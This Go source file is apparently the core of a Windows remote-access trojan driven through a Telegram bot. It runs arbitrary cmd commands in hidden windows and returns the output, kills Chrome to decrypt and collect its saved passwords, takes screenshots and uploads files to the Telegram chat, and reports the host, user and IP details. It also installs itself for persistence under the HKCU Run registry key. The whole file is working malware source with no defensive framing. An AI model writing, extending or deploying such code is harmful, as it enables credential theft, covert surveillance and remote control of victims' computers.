package main

import (
	"os"
	"os/exec"
	"strings"
	"gopkg.in/telegram-bot-api.v4"
	"log"
	"net"
	"net/http"
	"io/ioutil"
	"encoding/json"
	"strconv"
	"syscall"
	"golang.org/x/sys/windows/registry"
	"io"
	"github.com/vova616/screenshot"
	"image/png"
	"runtime"
	"unicode/utf8"
	"os/user"
	"database/sql"
	_ "github.com/mattn/go-sqlite3"
	"unsafe"
)

//import "gopkg.in/telegram-bot-api.v4"
/*
func sendMsg(chat_id int64, text string){
	msg := tgbotapi.NewMessage(chat_id, text)
	//msg.ReplyToMessageID = chat_id
	bot.Send(msg)
}*/

func listDir(path string) ([]string) {
	dir, _ := os.Open(path)
	defer dir.Close()
	fi, _ := dir.Stat()
	filenames := make([]string, 0)
	if fi == nil {
		return filenames
	}
	if fi.IsDir() {
		fis, _ := dir.Readdir(-1) // -1 means return all the FileInfos
		for _, fileinfo := range fis {
			if !fileinfo.IsDir() {
				filenames = append(filenames, fileinfo.Name())
			} else {
				filenames = append(filenames, fileinfo.Name()+"/")
			}
		}
	}
	return filenames
}

func arrToStr(sep string, arr []string) (string) {
	out := ""
	for _, el := range arr {
		out += el + sep
	}
	return out
}

func clearMSG(s string) (string) {
	if !utf8.ValidString(s) {
		v := make([]rune, 0, len(s))
		for i, r := range s {
			if r == utf8.RuneError {
				_, size := utf8.DecodeRuneInString(s[i:])
				if size == 1 {
					continue
				}
			}
			v = append(v, r)
		}
		s = string(v)
	}
	return s
}

func runCmd(command string, caller int64, api *tgbotapi.BotAPI) {
	cmd := exec.Command("cmd", "/Q", "/C", arrToStr(" ", strings.Split(command, " ")[1:]))
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	out, _ := cmd.Output()
	log.Println("output:", out)
	sendMsg(api, caller, "Done executing cmd:"+clearMSG(arrToStr(" ", strings.Split(command, " ")[1:])+":"+string(out)))
	log.Println("RUNNED SENT MSG!!!!" + clearMSG(arrToStr(" ", strings.Split(command, " ")[1:])+":"+string(out)))
}

func remove(slice []int, s int) []int {
	return append(slice[:s], slice[s+1:]...)
}

func getInfo() (string) {
	msg := ""
	hName, _ := os.Hostname()
	currUser, _ := user.Current()
	ipCfg, err := GetExternalIP()
	ipInfo := parseIpInfo(ipCfg)
	if err != nil {
		ipInfo = "unknown"
	}
	msg += strings.Split(currUser.Username, "\\")[1] + "@" + hName + "\n"
	msg += runtime.GOOS + "\n"
	msg += "IP info:\n"
	msg += "Internal:" + GetOutboundIP() + "\n"
	msg += "External info: " + ipInfo
	return msg
}

func NewBlob(d []byte) *DATA_BLOB {
	if len(d) == 0 {
		return &DATA_BLOB{}
	}
	return &DATA_BLOB{
		pbData: &d[0],
		cbData: uint32(len(d)),
	}
}

func Decrypt(data []byte) ([]byte, error) {
	var outblob DATA_BLOB
	r, _, err := procDecryptData.Call(uintptr(unsafe.Pointer(NewBlob(data))), 0, 0, 0, 0, 0, uintptr(unsafe.Pointer(&outblob)))
	if r == 0 {
		return nil, err
	}
	defer procLocalFree.Call(uintptr(unsafe.Pointer(outblob.pbData)))
	return outblob.ToByteArray(), nil
}

func getChrome() (string) {
	currUser, _ := user.Current()
	var url string
	var username string
	var password string
	killChromeCommand := "taskkill /F /IM chrome.exe /T"
	cmd := exec.Command("cmd", "/Q", "/C", killChromeCommand)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	cmdout, _ := cmd.Output()
	out := string(cmdout)
	path := "C:\\Users\\" + strings.Split(currUser.Username, "\\")[1] + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data"
	db, err := sql.Open("sqlite3", path)
	if err != nil {
		return err.Error()
	}
	rows, err := db.Query("SELECT origin_url,username_value,password_value from logins;")
	if err != nil {
		return err.Error()
	}
	for rows.Next() {
		rows.Scan(&url, &username, &password)
		pwd, err := Decrypt([]byte(password))
		if err != nil {
			out += "err:" + err.Error()
		}
		out += "uri:\"" + url + "\"; username: " + username + "; password: " + string(pwd) + "\n"
	}
	return out
}

func splitMessage(msg string) ([]string) {
	msgBytes := []byte(msg)
	out := []string{}
	for i := 0; i <= len(msgBytes); i += 3048 {
		chunk := ""
		for j := 0; j < 3048; j++ {
			//log.Println("i+j=",i+j,"; len(msg)=",len(msgBytes))
			if i+j >= len(msgBytes) {
				break
			} else {
				chunk += string(msgBytes[i+j])
			}
		}
		out = append(out, chunk)
	}
	return out
}

func GetOutboundIP() string {
	conn, err := net.Dial("udp", "8.8.8.8:80")
	if err != nil {
		return "unknown"
	}
	defer conn.Close()
	localAddr := conn.LocalAddr().String()
	idx := strings.LastIndex(localAddr, ":")
	return localAddr[0:idx]
}

func GetExternalIP() (*IpConfig, error) {
	addr := "http://ifconfig.co/json"
	hc := http.Client{}
	ipCfg := new(IpConfig)
	req, err := http.NewRequest("GET", addr, nil)
	out, err := hc.Do(req)
	outp, err := ioutil.ReadAll(out.Body)
	log.Println("response: ", string(outp))
	if err != nil {
		return ipCfg, err
	}
	json.Unmarshal(outp, ipCfg)
	return ipCfg, nil
}

func makeScreenshot(path string) {
	img, _ := screenshot.CaptureScreen()
	f, _ := os.Create(path)
	png.Encode(f, img)
	f.Close()
}

func uploadFile(chat int64, file string, api *tgbotapi.BotAPI, remove bool) {
	msg := tgbotapi.NewDocumentUpload(chat, file)
	api.Send(msg)
	if remove {
		os.Remove(file)
	}
}

func parseIpInfo(ipCfg *IpConfig) (string) {
	out := ""
	out += "Ip: " + ipCfg.Ip + "\n"
	out += "Country: " + ipCfg.Country + "\n"
	out += "City: " + ipCfg.City + "\n"
	out += "Outbond hostname: " + ipCfg.Hostname + "\n"
	return out
}

func dlFile(id string, name string, api *tgbotapi.BotAPI) (string) {
	url, err := api.GetFileDirectURL(id)
	out := new(os.File)
	if runtime.GOOS == "windows" {
		out, err = os.Create(pwd + "\\" + name)
	} else {
		out, err = os.Create(pwd + "/" + name)
	}
	defer out.Close()
	resp, err := http.Get(url)
	defer resp.Body.Close()
	_, err = io.Copy(out, resp.Body)
	if err != nil {
		return "(no)(" + err.Error() + ")"
	}
	if runtime.GOOS == "windows" {
		return pwd + "\\" + name
	} else {
		return pwd + "/" + name
	}
}

func CheckRegistryProgram() (value string, result bool) {
	value, err := GetRegistryKeyValue(registry.CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", nameFile)
	if err == nil {
		return value, true
	} else {
		return "", false
	}
}

func CheckError(err error) (bool) {
	return err != nil
}

func OutMessage(str string) {
	log.Println(str)
}

func RegistryFromConsole(usingAutorun bool, usingRegistry bool, rewriteExe bool) bool {
	value, flag := CheckRegistryProgram()
	OutMessage("Program autorun:" + value + ", flag = " + strconv.FormatBool(flag) + ", checkFile = " + strconv.FormatBool(CheckFileExist(value)))
	if !flag || !CheckFileExist(value) {
		var out []byte
		if rewriteExe {
			cmd := exec.Command("cmd", "/Q", "/C", "mkdir", fullPathBotDir)
			//cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
			out, _ = cmd.Output()
			OutMessage(string(out))
			cmd = exec.Command("cmd", "/Q", "/C", "move", "/Y", fullPathBotSourceExecFile, fullPathBotExecFile)
			//cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
			out, _ = cmd.Output()
			OutMessage(string(out))

			/*	if CheckFileExist(fullPathBotSourceExecFile) {
				DeleteFile(fullPathBotSourceExecFile)
			}*/

		} else {
			OutMessage("Rewrite EXE off ")
		}

		if usingRegistry {
			cmd := exec.Command("cmd", "/Q", "/C", "reg", "add", "HKCU\\Software\\"+botDir, "/f")
			cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
			out, _ = cmd.Output()
			OutMessage(string(out))
		} else {
			OutMessage("Save tokens to registry off")
		}
		if usingAutorun {
			cmd := exec.Command("cmd", "/Q", "/C", "reg", "add", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "/v", nameFile, "/d", fullPathBotExecFile)
			cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
			out, _ = cmd.Output()
			OutMessage(string(out))
		} else {
			OutMessage("Using autorun off ")
		}
		return true
	} else {
		return false
	}
}

func UnRegistryFromConsole(usingRegistry bool) {
	var out []byte

	cmd := exec.Command("cmd", "/Q", "/C", "rd", "/S", "/Q", fullPathBotDir)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	out, _ = cmd.Output()
	OutMessage(string(out))

	if usingRegistry {
		cmd = exec.Command("cmd", "/Q", "/C", "reg", "delete", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "/f", "/v", nameFile)
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		out, _ = cmd.Output()
		OutMessage(string(out))

		cmd = exec.Command("cmd", "/Q", "/C", "reg", "delete", "HKCU\\Software\\"+botDir, "/f")
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		out, _ = cmd.Output()
		OutMessage(string(out))
	}

}

func UnRegisterFromProgram() {
	UnRegisterAutoRun()
	RemoveDirWithContent(fullPathBotDir)
}

func RegisterAutoRun() error {
	err := WriteRegistryKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, nameFile, fullPathBotExecFile)
	CheckError(err)
	return err
}

func UnRegisterAutoRun() {
	DeleteRegistryKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, nameFile)
}
